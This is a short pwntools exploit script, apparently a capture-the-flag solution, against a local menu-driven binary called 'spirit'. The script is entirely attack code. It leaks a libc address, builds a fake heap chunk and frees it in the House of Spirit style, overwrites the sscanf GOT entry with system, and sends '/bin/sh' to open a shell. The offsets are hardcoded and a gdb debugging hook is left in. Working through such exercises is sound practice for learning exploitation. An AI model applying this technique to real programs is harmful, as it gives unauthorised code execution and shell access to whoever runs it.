from pwn import *
context.log_level="debug"
def add(name,description):
	p.readuntil("Action:")
	p.sendline("1")
	p.readuntil("Rifle name: ")
	p.sendline(name)
	p.readuntil("Rifle description: ")
	p.sendline(description)
	
def show():
	p.readuntil("Action:")
	p.sendline("2")
def delect():
	p.readuntil("Action:")
	p.sendline("3")
def mess(message):
	p.readuntil("Action:")
	p.sendline("4")
	p.readuntil("your order: ")
	p.sendline(message);
p=process("./spirit",stdin=PTY)
i=0x40-1
sscanf_got=0x804a258
add("A"*0x1b+p32(0x804a258-0x25),"ABC")
show()
p.readuntil("Name:")
p.readuntil("Name: ")
libc=u32(p.read(4))
log.info(hex(libc))
while(i>0):
	add(p32(0xdeadbeef),"12")
	i-=1
heapaddr=0x0804A2A4+0x4
payload="\0"*27+p32(heapaddr)
add(payload,p32(0x132132))
payload='\0'*0x24+'\x41'+"\x00\x00\x00"

mess(payload)
if True:
	gdb.attach(p,
	'''
	x/40xw 0x0804A2A4
	b *0x8048855
	''')
delect()
add(p32(sscanf_got),p32(sscanf_got))
sys_addr=libc-0x80484c6+0xf7e3eda0
mess(p32(sys_addr))
p.sendline("/bin/sh")
p.interactive();


